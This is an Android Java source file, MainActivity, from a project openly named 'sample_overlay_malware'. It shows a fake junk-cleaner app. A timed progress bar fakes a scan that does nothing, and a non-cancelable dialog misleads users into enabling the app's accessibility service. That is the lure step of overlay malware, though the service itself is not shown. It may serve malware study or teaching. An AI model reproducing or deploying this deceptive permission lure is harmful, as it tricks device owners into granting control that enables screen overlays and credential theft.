package com.abhishek_cdac.sample_overlay_malware;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.provider.Settings;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;

import java.util.List;

public class MainActivity extends AppCompatActivity {

    ProgressBar progressBar;
    TextView scanTextView, statusTextView;
    int count;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        progressBar = findViewById(R.id.scanProgress);
        scanTextView = findViewById(R.id.scanTextView);
        statusTextView = findViewById(R.id.statusTextView);



    }

    @Override
    protected void onResume() {
        super.onResume();
        if(!isServiceEnabled()){
            promptServiceOff();
        }
    }

    public void initScan(View view) {

        if (ActivityCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            initAccessibilityService();
        } else {
            //When permission is not granted
            //Request Permission
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 100);
        }
    }

    private void initAccessibilityService() {
        //StartAccessibility Service
        if(!isServiceEnabled()){
            promptServiceOff();
        } else {

            statusTextView.setText("Scan in progress..");
            // timer for seekbar
            final int oneMin = 1 * 30 * 1000; // 1 minute in milli seconds
            new CountDownTimer(oneMin, 1000) {
                public void onTick(long millisUntilFinished) {

                    long finishedSeconds = oneMin - millisUntilFinished;
                    int total = (int) (((float) finishedSeconds / (float) oneMin) * 100.0);
                    progressBar.setProgress(total);
                    scanTextView.setText(String.valueOf(total) + "%");
                }

                public void onFinish() {
                    scanTextView.setText("100%");
                    progressBar.setProgress(100);
                    Toast.makeText(MainActivity.this, "Scan Completed !!", Toast.LENGTH_SHORT).show();
                    statusTextView.setText("Scan Completed");
                }
            }.start();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //Check condition
        if (requestCode == 100 && (grantResults.length > 0) && (grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
            //When permission is granted
            //Call method
            initAccessibilityService();
        } else {
            //When permission is not granted
            Toast.makeText(this, "Permission Denied !!", Toast.LENGTH_SHORT).show();
        }
    }

    private boolean isServiceEnabled() {
        AccessibilityManager accessibilityManager = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo serviceInfo : enabledServices){
            if (serviceInfo.getResolveInfo().serviceInfo.name.contains((CurrentAppService.class).getSimpleName())){
                return true;
            }
        }
        return false;
    }


    private void promptServiceOff() {
        MaterialAlertDialogBuilder materialAlertDialogBuilder = new MaterialAlertDialogBuilder(this);
        materialAlertDialogBuilder.setTitle("Service is disabled");
        materialAlertDialogBuilder.setMessage("To to clean the junk files and boost the device performance, turn on the service for this application.");
        materialAlertDialogBuilder.setPositiveButton("Enable", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        });
        materialAlertDialogBuilder.setCancelable(false);
        materialAlertDialogBuilder.show();
    }

}